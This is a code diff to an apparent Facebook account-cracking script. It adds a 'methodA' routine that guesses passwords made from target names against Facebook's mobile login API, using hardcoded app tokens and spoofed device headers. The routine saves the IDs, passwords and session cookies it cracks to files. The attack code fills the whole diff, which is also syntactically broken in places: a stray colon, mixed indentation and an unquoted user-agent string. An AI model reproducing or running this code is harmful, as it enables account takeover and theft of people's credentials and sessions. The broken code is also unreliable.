@@ -685,6 +685,8 @@ def menu():
 					crack_submit.submit(ffb7,ids,names,passlist)
 				elif mthd in ['10','10']:
 					crack_submit.submit(ffb8,ids,names,passlist)
+				elif mthd in ['11','11']:
+					crack_submit.submit(methodA,self, sid, name, psw):
 				
 				else:
 					crack_submit.submit(api,ids,names,passlist)
@@ -967,82 +969,69 @@ def ffb(ids,names,passlist):
 
 #-----------------  Random METHOD Api   -------------------------------------
 
-def rcrack1(ids,passlist):
-	global loop
-	global oks
-	try:
-		for pas in passlist:
-			sys.stdout.write('\r\r\033[1;32m [GS XD] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
-			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
-			application_version_code=str(random.randint(000000000,999999999))
-			__iam_genius = random.choice(android_models)
-			phone_model = __iam_genius.split('|')[0]
-			phone_company = __iam_genius.split('|')[1]
-			dimensions = __iam_genius.split('|')[2]
-			ffb=random.choice(fbks)
-			dvlk = random.choice(usr)
-			ua=random.choice(ugen)
-			ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/{str(application_version)};FBPN/com.facebook.katana;FBLC/en_PK;FBCR/null;FBBV/{str(application_version_code)};FBMF/{str(phone_company)};FBBD/{str(phone_company)};FBDV/{str(phone_company)};FBSV/11;;FBDM/'+'{density=3.0,height=360,width=800};]'
-			li = ['28','29','210']
-			li2 = random.choice(li)
-			j1 = ''.join(random.choice(digits) for _ in range(2))
-			j2 = li2+j1
-			device_family_id = str(uuid.uuid4())
-			adid = str(uuid.uuid4())
-			machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
-			data = {'adid':adid,
-			'format':'json',
-			'device_id':device_family_id,
-			'email':ids,
-			'password':pas,
-			'generate_analytics_claim':'1',
-			'community_id':'','cpl':'true','try_num':'1',
-			'family_device_id':device_family_id,
-			'credentials_type':'device_based_login_password',
-			'generate_session_cookies':'1',
-			'error_detail_type':'button_with_disabled',
-			'source':'device_based_login',
-			'machine_id':machine_id,
-			'login_location_accuracy_m':'1.0',
-			'meta_inf_fbmeta':'',
-			'advertiser_id':adid,
-			'encrypted_msisdn':'',
-			'currently_logged_in_userid':'0',
-			'locale':'en_PK',
-			'client_country_code':'PK',
-			'method':'auth.login',
-			'fb_api_req_friendly_name':'authenticate',
-			'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
-			'access_token':'1681481512|af1505f683b19cd2fd4f21948f03f0b4'}
-			head = {
-			'content-type':'application/x-www-form-urlencoded',
-			'x-fb-sim-hni':str(random.randint(2e4,4e4)),
-			'x-fb-connection-type':'unknown',
-			'Authorization':'OAuth 1681481512|af1505f683b19cd2fd4f21948f03f0b4',
-			'user-agent':ua,
-			'x-fb-net-hni':str(random.randint(2e4,4e4)),
-			'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
-			'x-fb-connection-quality':'EXCELLENT',
-			'x-fb-friendly-name':'authenticate',
-			'accept-encoding':'gzip, deflate',
-			'x-fb-http-engine':	'Liger'}
-			url = 'https://b-api.facebook.com/method/auth.login'
-			po = requests.post(url,data=data,headers=head,allow_redirects=False).text
-			q = json.loads(po)
-			if 'session_key' in q:
-				udx = str(q['uid'])
-				print('\r\r\033[1;32m [GS XD-OK] '+udx+' | '+pas+'\033[1;97m')
-				open('/sdcard/GS XD-OK.txt', 'a').write(udx+'|'+pas+'\n')
-				oks.append(ids)
-				break
-			elif 'www.facebook.com' in q['error_msg']:
-				print('\r\r\x1b[38;5;208m [GS XD-CP] '+ids+' | '+pas+'\033[1;97m')
-				open('/sdcard/GS XD-CP.txt','a').write(ids+'|'+pas+'\n')
-				cps.append(ids)
-				break
-			else:
-				continue
-		loop+=1
+def methodA(self, sid, name, psw):
+        try:
+            global oks,cps,loop
+            sys.stdout.write(f"\r {S}[SSB] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.flush()
+            fs = name.split(' ')[0]
+            try:
+                ls = name.split(' ')[1]
+            except:
+                ls = fs
+            for pw in psw:
+                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
+                with requests.Session() as session:
+                    data = {"adid": str(uuid.uuid4()),
+"format": "json",
+"device_id": str(uuid.uuid4()),
+"cpl": "true",
+"family_device_id": str(uuid.uuid4()),
+"credentials_type": "device_based_login_password",
+"error_detail_type": "button_with_disabled",
+"source": "device_based_login",
+"email": sid,
+"password": ps,
+"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+"generate_session_cookies": "1",
+"meta_inf_fbmeta": "",
+"advertiser_id": str(uuid.uuid4()),
+"currently_logged_in_userid": "0",
+"locale": "en_GB",
+"client_country_code": "GB",
+"method": "auth.login",
+"fb_api_req_friendly_name": "authenticate",
+"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+"api_key": "882a8490361da98702bf97a021ddc14d"}
+                headers = {'User-Agent': randBuildvsskj(),
+'Content-Type': 'application/x-www-form-urlencoded',
+'Host': 'graph.facebook.com',
+'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+'X-FB-Connection-Type': 'MOBILE.LTE',
+'X-Tigon-Is-Retry': 'False',
+'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+'x-fb-device-group': '5120',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Client-IP': 'True',
+'X-FB-Server-Cluster': 'True',
+'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+                if 'session_key' in q:
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
+                    print(f"\r{R} [SSB-OK] {sid} | {ps} {S}")
+                    oks.append(sid)
+                    open('/sdcard/SSB_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    break
+                elif 'www.facebook.com' in q['error']['message']:
+                     #print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
+                     cps.append(sid)
+                     open('/sdcard/SSB_CP.txt','a').write(sid+'|'+ps+'\n')
+                else:
+                    continue
+            loop+=1
 	except requests.exceptions.ConnectionError:
 		time.sleep(10)
 	except Exception as e:
@@ -1077,15 +1066,12 @@ def rcrack(ids,passlist):
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': pro}
+            'user-agent': Mozilla/5.0 (Linux; Android 10; SM-N971U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/358.0.0.34.117;]',}
 			lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
